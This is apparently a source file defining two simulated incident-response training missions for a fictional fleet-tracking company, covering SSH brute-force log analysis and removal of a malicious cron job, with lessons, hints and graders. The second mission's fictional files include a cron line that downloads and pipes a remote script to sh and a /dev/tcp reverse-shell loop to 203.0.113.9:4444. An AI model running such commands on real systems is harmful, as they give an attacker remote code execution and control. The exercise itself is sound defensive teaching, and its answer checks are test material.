import type { InvestigationMission } from "../../domain/types";

const COMPANY_INTRO = "Nimbus Freight (fictional) runs a small fleet-tracking platform. You are a trainee on the operations team.";

/**
 * Introductory networking / defensive security investigation.
 * Everything here is a fictional, isolated system. No real hosts are contacted.
 */
export const netsecMissions: InvestigationMission[] = [
  {
    id: "netsec-01-brute-force",
    kind: "investigation",
    trackId: "netsec",
    stage: 2,
    title: "Who is knocking? Investigate failed SSH logins",
    summary: "Read an auth log, identify a brute-force source, confirm the firewall rule, and apply least privilege.",
    briefing: `${COMPANY_INTRO}\n\nThe jump host shows hundreds of failed SSH logins overnight. Your lead wants to know: which IP address is responsible, did any login from it succeed, and is the firewall actually blocking it? Then tighten one obvious permission problem you find along the way.`,
    objectives: [
      "Find the single IP address with the most 'Failed password' entries in /var/log/auth.log",
      "Determine whether that IP ever logged in successfully ('Accepted password')",
      "Write the attacker IP into ~/incident/attacker.txt and a one-line verdict into ~/incident/verdict.txt",
      "Lock down the world-readable private key /home/trainee/.ssh/id_ed25519 to mode 600",
      "Answer the short question about which port and protocol SSH uses",
    ],
    skills: ["netsec.dns-ports", "netsec.authz", "netsec.logs", "netsec.hardening"],
    prerequisites: ["linux-02-log-detective"],
    estimatedMinutes: 20,
    commandsIntroduced: ["grep", "cut", "sort", "uniq", "ss", "chmod", "ping"],
    lesson: [
      {
        title: "Ports, protocols and SSH",
        body: "Every network service listens on a **port** (a number 1-65535) using a transport protocol, usually **TCP** (reliable, ordered) or **UDP** (fast, no delivery guarantee). SSH, the secure remote shell, listens on TCP port 22 by default. `ss -tlnp` lists listening TCP ports on a host.",
      },
      {
        title: "Authentication vs authorization",
        body: "**Authentication** proves who you are (password, key). **Authorization** decides what you may do once identified. A brute-force attack guesses passwords repeatedly; the defence is keys instead of passwords, rate limiting, and firewalls. **Least privilege** means every file and account gets only the access it needs. A private key readable by everyone (`-rw-r--r--`) violates it: anyone on the host could steal it.",
      },
      {
        title: "Reading auth logs",
        body: "Lines like `sshd[412]: Failed password for invalid user admin from 203.0.113.42 port 51102 ssh2` record one failed attempt. Count attempts per IP: `grep 'Failed password' auth.log | grep -o 'from [0-9.]*' | sort | uniq -c | sort -rn`. (This simulator's grep has no -o, so use `cut -d' ' -f11` or `-f13` depending on the line; look first.) Then check for `Accepted` from the same IP.",
      },
    ],
    glossary: [
      { term: "brute force", definition: "Trying many passwords quickly until one works." },
      { term: "firewall", definition: "A filter that allows or blocks network connections by address, port and protocol." },
      { term: "least privilege", definition: "Grant the minimum access required and nothing more." },
      { term: "private key", definition: "The secret half of an SSH key pair. Must be readable only by its owner." },
    ],
    hints: [
      { level: 1, title: "Look at the shape", body: "`head -n 5 /var/log/auth.log` first. Notice the word after 'from' is the source IP." },
      { level: 2, title: "Count per IP", body: "Failed lines have the IP as the 11th or 13th space-separated field depending on 'invalid user'. Easiest: `grep 'Failed password' /var/log/auth.log | grep -c 203.0.113.42` for each candidate IP you see." },
      { level: 3, title: "Any success?", body: "`grep Accepted /var/log/auth.log` then check whether the attacker IP appears. Record your verdict in ~/incident/verdict.txt." },
      { level: 4, title: "Guided example", body: "```\nmkdir -p ~/incident\ngrep 'Failed password' /var/log/auth.log | grep -c 203.0.113.42\ngrep 'Failed password' /var/log/auth.log | grep -c 198.51.100.7\ngrep Accepted /var/log/auth.log\necho 203.0.113.42 > ~/incident/attacker.txt\necho \"no successful login from attacker; firewall rule present\" > ~/incident/verdict.txt\ncat /etc/firewall/rules\nchmod 600 ~/.ssh/id_ed25519\n```" },
    ],
    reflectionPrompts: ["Explain how you identified the attacking address and how you decided whether the attack succeeded. What evidence would have changed your verdict?"],
    transferNote: "This is the core loop of defensive work: evidence from logs, a clear verdict with its basis, and one hardening change that reduces future risk.",
    world: {
      hostname: "jump-01",
      user: "trainee",
      cwd: "/home/trainee",
      fs: {
        "/var/log/auth.log": { type: "file", content: generateAuthLog(), mode: 0o644, owner: "root", group: "root" },
        "/etc/firewall": { type: "dir" },
        "/etc/firewall/rules": { type: "file", content: "# Nimbus jump host firewall (fictional format)\nallow tcp 22 from 10.0.0.0/8\nallow tcp 22 from 198.51.100.0/24\ndeny  tcp 22 from 203.0.113.42\ndeny  all\n", mode: 0o644, owner: "root", group: "root" },
        "/home/trainee/.ssh": { type: "dir", mode: 0o700 },
        "/home/trainee/.ssh/id_ed25519": { type: "file", content: "-----BEGIN OPENSSH PRIVATE KEY-----\n(fictional key material)\n-----END OPENSSH PRIVATE KEY-----\n", mode: 0o644 },
        "/home/trainee/.ssh/id_ed25519.pub": { type: "file", content: "ssh-ed25519 AAAA(fictional) trainee@jump-01\n", mode: 0o644 },
        "/home/trainee/README-incident.txt": { type: "file", content: "Create ~/incident and record findings there: attacker.txt (IP only) and verdict.txt (one line).\n" },
      },
      processes: [
        { pid: 1, user: "root", cpu: 0, mem: 0.1, command: "/sbin/init" },
        { pid: 412, user: "root", cpu: 0.2, mem: 0.4, command: "/usr/sbin/sshd -D", service: "ssh" },
      ],
      services: [{ name: "ssh", status: "running", description: "OpenSSH server" }],
    },
    steps: [
      {
        id: "identify",
        prompt: "Identify the attacking IP and whether it ever succeeded.",
        checks: [
          { id: "searched", label: "Searched auth.log for failed logins", test: (c) => c.history.some((h) => /grep/.test(h) && /auth\.log/.test(h)) },
          { id: "attacker", label: "~/incident/attacker.txt contains 203.0.113.42", test: (c) => (c.readFile("/home/trainee/incident/attacker.txt") ?? "").trim() === "203.0.113.42" },
          { id: "accepted", label: "Checked for successful logins (Accepted)", test: (c) => c.history.some((h) => /grep.*Accepted/.test(h)) },
          { id: "verdict", label: "~/incident/verdict.txt states no successful attacker login", test: (c) => /no|none|never|did not|didn't|0 success/i.test(c.readFile("/home/trainee/incident/verdict.txt") ?? "") },
        ],
      },
      {
        id: "harden",
        prompt: "Apply least privilege to the exposed private key.",
        checks: [
          { id: "key-mode", label: "~/.ssh/id_ed25519 is mode 600", test: (c) => c.mode("/home/trainee/.ssh/id_ed25519") === 0o600 },
          { id: "firewall", label: "Read the firewall rules", test: (c) => c.outputs.some((o) => /firewall\/rules/.test(o.command) && o.stdout.includes("deny")) },
        ],
        question: {
          prompt: "SSH normally listens on which port and transport protocol?",
          options: ["TCP 22", "UDP 22", "TCP 443", "UDP 53"],
          correctIndex: 0,
          explanation: "SSH uses TCP port 22 by default. 443 is HTTPS and UDP 53 is DNS.",
        },
      },
    ],
  },
  {
    id: "netsec-02-suspicious-cron",
    kind: "investigation",
    trackId: "netsec",
    stage: 3,
    title: "Persistence: a cron job that phones home",
    summary: "An account was compromised and left a cron job behind. Find the indicator of compromise, contain the process and its persistence, and decide what prevents a repeat.",
    briefing: `${COMPANY_INTRO}\n\nThe API host has been running hot since last night and the firewall team noticed outbound traffic to an address nobody recognises. The deploy account logged in with a password from the internet at 23:41. Investigate what was left behind, contain it, and record the indicators for the incident report. Everything here is fictional and isolated.`,
    objectives: [
      "Read the cron entries, the process list and the socket table to find the malicious job, its process and where it connects",
      "Record the attacker's IP address in ~/incident/ioc.txt",
      "Stop the process, remove the cron file and the dropped script, and verify the connection is gone",
      "Write a one-line summary and answer the hardening question",
    ],
    skills: ["netsec.logs", "netsec.incident", "netsec.hardening"],
    prerequisites: ["netsec-01-brute-force", "linux-05-runaway-process"],
    estimatedMinutes: 25,
    commandsIntroduced: ["ls -la", "cat", "ps", "ss", "grep", "kill", "rm -r"],
    lesson: [
      {
        title: "Persistence and indicators of compromise",
        body: "After getting in, an attacker wants to stay in: a **cron job**, a service, an added SSH key. Hunting for persistence means reading the places where things get scheduled (`/etc/cron.d`, `crontab -l`) and started. An **indicator of compromise (IoC)** is a concrete, shareable fact: an IP address, a file path, a hash, a command line. Record them exactly; other teams block on them.",
      },
      {
        title: "Evidence from three angles",
        body: "The cron file shows what runs and as whom. `ps aux` shows what is running now (dropped files in hidden `/tmp` directories are a classic sign). `ss -tnp` shows established connections: a process talking to an unknown address on an odd port (4444 is a common reverse-shell port) is the smoking gun. `grep` the auth log for how the account was used.",
      },
      {
        title: "Contain, then harden",
        body: "Containment order matters: stop the running process, remove the persistence (the cron file) so it does not come back, remove the dropped files, then verify with `ps` and `ss`. Hardening addresses how they got in: the deploy account accepted a **password** from the internet. Keys only, password authentication off, and a rotated credential close that door; deleting logs or blocking one port does not.",
      },
    ],
    glossary: [
      { term: "persistence", definition: "A mechanism an attacker installs to keep access after a reboot or logout (cron, service, SSH key)." },
      { term: "indicator of compromise", definition: "A concrete observable (IP, path, hash, command) that identifies malicious activity." },
      { term: "reverse shell", definition: "A connection the victim machine opens outward to the attacker, who then controls it; port 4444 is a common default." },
      { term: "containment", definition: "Stopping the damage from spreading before the full investigation and cleanup." },
    ],
    hints: [
      { level: 1, title: "Start where things are scheduled", body: "`ls -la /etc/cron.d` and `cat` each file. One of them downloads and runs a script from an IP address every few minutes." },
      { level: 2, title: "Confirm it is running and talking", body: "`ps aux` shows a process from a hidden directory in /tmp. `ss -tnp` shows its connection to the same IP on port 4444. `grep deploy /var/log/auth.log` shows the password login from that IP at 23:41." },
      { level: 3, title: "Contain in order", body: "`mkdir -p ~/incident; echo 203.0.113.9 > ~/incident/ioc.txt`. Then `sudo kill -9 PID`, `sudo rm /etc/cron.d/fleet-cleanup`, `sudo rm -r /tmp/.cache-x`, and verify with `ps aux` and `ss -tnp`." },
      { level: 4, title: "Guided example", body: "```\nls -la /etc/cron.d\ncat /etc/cron.d/fleet-cleanup\nps aux\nss -tnp\ngrep deploy /var/log/auth.log\ncat /tmp/.cache-x/kworkerd\nmkdir -p ~/incident\necho 203.0.113.9 > ~/incident/ioc.txt\nsudo kill -9 3127\nsudo rm /etc/cron.d/fleet-cleanup\nsudo rm -r /tmp/.cache-x\nps aux\nss -tnp\necho \"deploy account compromised via password login from 203.0.113.9 at 23:41; cron persistence /etc/cron.d/fleet-cleanup ran /tmp/.cache-x/kworkerd connecting to 203.0.113.9:4444; process killed, cron and files removed\" > ~/incident/summary.txt\n```" },
    ],
    reflectionPrompts: ["Walk through the evidence that tied the cron job, the process and the network connection together. What would you do differently if the process had been the API itself?"],
    transferNote: "Finding persistence, recording IoCs and containing in the right order is the daily shape of incident response; the commands are the same ones you use for ordinary troubleshooting.",
    world: {
      hostname: "fleet-api-02",
      user: "trainee",
      cwd: "/home/trainee",
      fs: {
        "/etc/cron.d": { type: "dir", mode: 0o755, owner: "root", group: "root" },
        "/etc/cron.d/nightly-report": { type: "file", content: "# Nimbus nightly fleet report\n0 2 * * * reports /usr/bin/python3 /opt/reports/nightly.py --since yesterday\n", mode: 0o644, owner: "root", group: "root" },
        "/etc/cron.d/fleet-cleanup": { type: "file", content: "*/5 * * * * deploy curl -s http://203.0.113.9/u.sh | sh\n", mode: 0o644, owner: "deploy", group: "deploy" },
        "/tmp/.cache-x": { type: "dir", mode: 0o700, owner: "deploy", group: "deploy" },
        "/tmp/.cache-x/kworkerd": { type: "file", content: "#!/bin/sh\n# (fictional) keeps a connection open to 203.0.113.9:4444 and runs whatever it is told\nwhile true; do /bin/sh -i < /dev/tcp/203.0.113.9/4444 > /dev/tcp/203.0.113.9/4444 2>&1; sleep 30; done\n", mode: 0o755, owner: "deploy", group: "deploy" },
        "/var/log/auth.log": { type: "file", content: "Mar 08 22:10:04 fleet-api-02 sshd[644]: Accepted publickey for trainee from 10.0.1.5 port 50210 ssh2: ED25519 SHA256:(fictional)\nMar 08 23:39:51 fleet-api-02 sshd[644]: Failed password for deploy from 203.0.113.9 port 40112 ssh2\nMar 08 23:40:20 fleet-api-02 sshd[644]: Failed password for deploy from 203.0.113.9 port 40113 ssh2\nMar 08 23:41:02 fleet-api-02 sshd[644]: Accepted password for deploy from 203.0.113.9 port 40114 ssh2\nMar 08 23:41:30 fleet-api-02 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee /etc/cron.d/fleet-cleanup\nMar 08 23:44:10 fleet-api-02 sshd[644]: Disconnected from user deploy 203.0.113.9 port 40114\nMar 09 08:55:12 fleet-api-02 sshd[644]: Accepted publickey for trainee from 10.0.1.5 port 50388 ssh2: ED25519 SHA256:(fictional)\n", mode: 0o644, owner: "root", group: "root" },
        "/home/trainee/ticket.txt": { type: "file", content: "SEC-0092: firewall team sees fleet-api-02 connecting to 203.0.113.9:4444 every few minutes since ~23:45 last night. Deploy account logged in with a PASSWORD from the internet at 23:41. Investigate, contain, record IoCs in ~/incident/.\n" },
      },
      processes: [
        { pid: 1, user: "root", cpu: 0, mem: 0.1, command: "/sbin/init" },
        { pid: 644, user: "root", cpu: 0.1, mem: 0.5, command: "/usr/sbin/sshd -D", service: "ssh" },
        { pid: 1881, user: "fleet", cpu: 2.9, mem: 6.1, command: "/opt/fleet/bin/fleet-api --config /etc/fleet/api.conf", service: "fleet-api" },
        { pid: 3127, user: "deploy", cpu: 41.6, mem: 1.2, command: "/bin/sh /tmp/.cache-x/kworkerd" },
      ],
      services: [
        { name: "ssh", status: "running", description: "OpenSSH server" },
        { name: "fleet-api", status: "running", description: "Nimbus fleet API" },
      ],
      network: {
        listening: [
          { proto: "tcp", port: 22, process: "sshd" },
          { proto: "tcp", port: 8080, process: "fleet-api" },
        ],
        connections: [
          { proto: "tcp", local: "10.0.4.12:49822", peer: "203.0.113.9:4444", process: "sh", pid: 3127 },
          { proto: "tcp", local: "10.0.4.12:22", peer: "10.0.1.5:50388", process: "sshd", pid: 644 },
        ],
      },
    },
    steps: [
      {
        id: "investigate",
        prompt: "Find the persistence, the process and the connection; record the attacker's address.",
        checks: [
          { id: "cron", label: "Read the malicious cron file", test: (c) => c.outputs.some((o) => /cron\.d/.test(o.command) && o.stdout.includes("203.0.113.9/u.sh")) },
          { id: "ps", label: "Listed processes with ps or top", test: (c) => c.history.some((h) => /^(ps|top)\b/.test(h)) },
          { id: "ss", label: "Saw the connection to 203.0.113.9:4444 with ss or netstat", test: (c) => c.outputs.some((o) => /^(ss|netstat)\b/.test(o.command) && o.stdout.includes("203.0.113.9:4444")) },
          { id: "auth", label: "Checked how the deploy account was used (auth.log)", test: (c) => c.outputs.some((o) => /auth\.log/.test(o.command) && o.stdout.includes("Accepted password for deploy")) },
          { id: "ioc", label: "~/incident/ioc.txt contains 203.0.113.9", test: (c) => (c.readFile("/home/trainee/incident/ioc.txt") ?? "").includes("203.0.113.9") },
        ],
      },
      {
        id: "contain",
        prompt: "Contain: stop the process, remove the persistence and the dropped files, verify, and summarise.",
        checks: [
          { id: "killed", label: "The kworkerd process (PID 3127) is gone", test: (c) => !c.processes.some((p) => p.pid === 3127) },
          { id: "cron-removed", label: "/etc/cron.d/fleet-cleanup removed (the legitimate nightly-report kept)", test: (c) => !c.exists("/etc/cron.d/fleet-cleanup") && c.exists("/etc/cron.d/nightly-report") },
          { id: "files-removed", label: "/tmp/.cache-x removed", test: (c) => !c.exists("/tmp/.cache-x") },
          { id: "verified", label: "Verified with ss that the connection to 203.0.113.9 is gone", test: (c) => { const last = [...c.outputs].reverse().find((o) => /^(ss|netstat)\b/.test(o.command)); return { passed: Boolean(last && !last.stdout.includes("203.0.113.9")), detail: last ? "last ss output still shows the connection" : "run ss after containment" }; } },
          { id: "api-kept", label: "fleet-api and sshd still running", test: (c) => c.processes.some((p) => p.pid === 1881) && c.processes.some((p) => p.pid === 644) },
          { id: "summary", label: "~/incident/summary.txt names the deploy account, cron and the attacker address", test: (c) => { const t = c.readFile("/home/trainee/incident/summary.txt") ?? ""; return /deploy/.test(t) && /cron/i.test(t) && /203\.0\.113\.9/.test(t); } },
        ],
        question: {
          prompt: "The deploy account was reached with a password from the internet. Which change best prevents a repeat?",
          options: [
            "Delete /var/log/auth.log so the attacker cannot see what was logged",
            "Rotate the deploy credential, allow SSH keys only and disable password authentication",
            "Block outbound port 4444 at the firewall and consider it fixed",
            "Reboot the host so the process cannot come back",
          ],
          correctIndex: 1,
          explanation: "The entry point was a guessable password accepted over SSH. Rotating the credential and moving to keys only (PasswordAuthentication no) removes that door. Blocking one port, rebooting or deleting evidence leaves it open.",
        },
      },
    ],
  },
];

function generateAuthLog(): string {
  const lines: string[] = [];
  const users = ["admin", "root", "ubuntu", "test", "oracle", "deploy", "pi"];
  let minute = 0;
  for (let i = 0; i < 120; i++) {
    minute += 1;
    const hh = String(2 + Math.floor(minute / 60)).padStart(2, "0");
    const mm = String(minute % 60).padStart(2, "0");
    const ts = `Mar 09 ${hh}:${mm}:${String((i * 7) % 60).padStart(2, "0")}`;
    if (i % 17 === 5) {
      lines.push(`${ts} jump-01 sshd[412]: Failed password for trainee from 198.51.100.7 port 50000 ssh2`);
    } else if (i % 23 === 11) {
      lines.push(`${ts} jump-01 sshd[412]: Accepted publickey for trainee from 198.51.100.7 port 50001 ssh2: ED25519 SHA256:(fictional)`);
    } else if (i % 31 === 20) {
      lines.push(`${ts} jump-01 sshd[412]: Failed password for root from 192.0.2.99 port 41000 ssh2`);
    } else {
      const u = users[i % users.length];
      lines.push(`${ts} jump-01 sshd[412]: Failed password for ${u === "root" ? "root" : "invalid user " + u} from 203.0.113.42 port ${51000 + i} ssh2`);
    }
  }
  lines.push("Mar 09 04:05:00 jump-01 sshd[412]: Connection closed by 203.0.113.42 port 51120 [preauth]");
  return lines.join("\n") + "\n";
}
